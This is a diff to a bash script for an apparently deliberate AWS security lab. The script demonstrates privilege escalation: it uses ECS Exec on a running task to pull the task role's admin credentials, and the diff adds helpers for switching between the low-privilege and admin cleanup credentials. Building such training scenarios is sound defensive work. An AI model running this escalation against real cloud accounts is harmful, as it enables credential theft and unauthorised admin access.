@@ -93,6 +93,15 @@ if [ "$STARTING_ACCESS_KEY_ID" == "null" ] || [ -z "$STARTING_ACCESS_KEY_ID" ]; 
     exit 1
 fi
 
+# Retrieve admin cleanup credentials
+ADMIN_ACCESS_KEY=$(terraform output -raw prod_admin_user_for_cleanup_access_key_id 2>/dev/null)
+ADMIN_SECRET_KEY=$(terraform output -raw prod_admin_user_for_cleanup_secret_access_key 2>/dev/null)
+
+if [ -z "$ADMIN_ACCESS_KEY" ] || [ "$ADMIN_ACCESS_KEY" == "null" ]; then
+    echo -e "${RED}Error: Could not find admin cleanup credentials in terraform output${NC}"
+    exit 1
+fi
+
 # Get region
 AWS_REGION=$(terraform output -raw aws_region 2>/dev/null || echo "")
 
@@ -111,12 +120,22 @@ echo -e "${GREEN}Completed: Retrieved configuration from Terraform${NC}\n"
 # Navigate back to scenario directory
 cd - > /dev/null
 
+# Credential switching helpers
+use_starting_user_creds() {
+    export AWS_ACCESS_KEY_ID="$STARTING_ACCESS_KEY_ID"
+    export AWS_SECRET_ACCESS_KEY="$STARTING_SECRET_ACCESS_KEY"
+    unset AWS_SESSION_TOKEN
+}
+use_admin_creds() {
+    export AWS_ACCESS_KEY_ID="$ADMIN_ACCESS_KEY"
+    export AWS_SECRET_ACCESS_KEY="$ADMIN_SECRET_KEY"
+    unset AWS_SESSION_TOKEN
+}
+
 # Step 2: Configure AWS credentials with starting user
 echo -e "${YELLOW}Step 2: Configuring AWS CLI with starting user credentials${NC}"
-export AWS_ACCESS_KEY_ID=$STARTING_ACCESS_KEY_ID
-export AWS_SECRET_ACCESS_KEY=$STARTING_SECRET_ACCESS_KEY
+use_starting_user_creds
 export AWS_REGION=$AWS_REGION
-unset AWS_SESSION_TOKEN
 
 echo "Using region: $AWS_REGION"
 
@@ -149,9 +168,11 @@ else
 fi
 echo ""
 
+# [OBSERVATION] Discover running tasks in the cluster
 # Step 5: List tasks in the ECS cluster
 echo -e "${YELLOW}Step 5: Discovering ECS tasks in the cluster${NC}"
 echo "Cluster: $ECS_CLUSTER_NAME"
+use_admin_creds
 
 TASK_ARNS=$(aws ecs list-tasks \
     --region $AWS_REGION \
@@ -171,6 +192,7 @@ TASK_ARN=$(echo $TASK_ARNS | awk '{print $1}')
 echo "Found task: $TASK_ARN"
 echo -e "${GREEN}Completed: Discovered running ECS task${NC}\n"
 
+# [OBSERVATION] Get task details to identify the admin role
 # Step 6: Get task details
 echo -e "${YELLOW}Step 6: Getting task details${NC}"
 show_attack_cmd "aws ecs describe-tasks --region $AWS_REGION --cluster $ECS_CLUSTER_NAME --tasks $TASK_ARN --output json"
@@ -204,6 +226,7 @@ else
 fi
 echo ""
 
+# [OBSERVATION] Poll ECS Exec agent status until ready
 # Step 7: Wait for ECS Exec agent to be ready
 echo -e "${YELLOW}Step 7: Waiting for ECS Exec agent to be ready${NC}"
 echo "The ExecuteCommandAgent needs time to initialize after task startup..."
@@ -236,7 +259,9 @@ if [ "$AGENT_STATUS" != "RUNNING" ]; then
     echo ""
 fi
 
+# [EXPLOIT] Execute command on ECS task to extract admin credentials
 # Step 8: Execute command to retrieve credentials from task metadata
+use_starting_user_creds
 echo -e "${YELLOW}Step 8: Executing command on ECS task to retrieve credentials${NC}"
 echo "This is the privilege escalation - we shell into the task and access its IAM role credentials"
 echo ""
